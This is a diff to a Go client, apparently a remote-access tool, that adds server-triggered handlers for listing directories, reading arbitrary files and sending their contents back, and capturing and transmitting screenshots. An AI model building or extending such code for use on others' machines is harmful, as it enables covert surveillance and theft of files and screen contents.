@@ -1,9 +1,14 @@
 package main
 
 import (
+	"bytes"
 	"fmt"
+	"image/jpeg"
+	"io"
 	"os"
 	"yotamura/common"
+
+	"github.com/kbinani/screenshot"
 )
 
 func (c *Client) initializeHandlers() {
@@ -26,20 +31,20 @@ func (c *Client) initializeHandlers() {
 		c.SendJsonMessage(common.CreateMessage(content))
 	}
 
-	c.Actions["FileData"] = func(message common.Message) {
+	c.Actions["DirectoryData"] = func(message common.Message) {
 		fmt.Println("file")
-		var content common.FileData
+		var content common.DirectoryData
 		common.DecodeData(message.Data, &content)
 		var files []common.File
 		osFiles, err := os.ReadDir(content.Path)
 		if err != nil {
-			fmt.Println("can't read dir ", err)
+			//failed to read dir contents
 		}
 		for _, file := range osFiles {
 			files = append(files, common.File{Name: file.Name(), IsDirectory: file.Type().IsDir()})
 		}
 		fmt.Println(files)
-		c.SendJsonMessage(common.CreateMessage(common.FileData{Path: content.Path, Files: files}))
+		c.SendJsonMessage(common.CreateMessage(common.DirectoryData{Path: content.Path, Files: files}))
 	}
 	c.Actions["ReadFileData"] = func(message common.Message) {
 		fmt.Println("read")
@@ -47,8 +52,25 @@ func (c *Client) initializeHandlers() {
 		common.DecodeData(message.Data, &content)
 		output, err := os.ReadFile(content.Path)
 		if err != nil {
-			//handle err
+			//failed to read file
 		}
 		c.SendJsonMessage(common.CreateMessage(common.ReadFileData{Path: content.Path, Content: output}))
+	}
+	c.Actions["ScreenshotData"] = func(message common.Message) {
+		image, err := screenshot.CaptureDisplay(0)
+		if err != nil {
+			//failed to capture screenshot
+		}
+		buf := new(bytes.Buffer)
+
+		resizedImage := common.ResizeImage(image, 1280, 720)
+		jpeg.Encode(buf, resizedImage, &jpeg.Options{Quality: 90})
+
+		imageBytes, err := io.ReadAll(buf)
+		if err != nil {
+			//failed to read all bytes from jpeg
+		}
+
+		c.SendJsonMessage(common.CreateMessage(common.ScreenshotData{Screenshot: imageBytes}))
 	}
 }
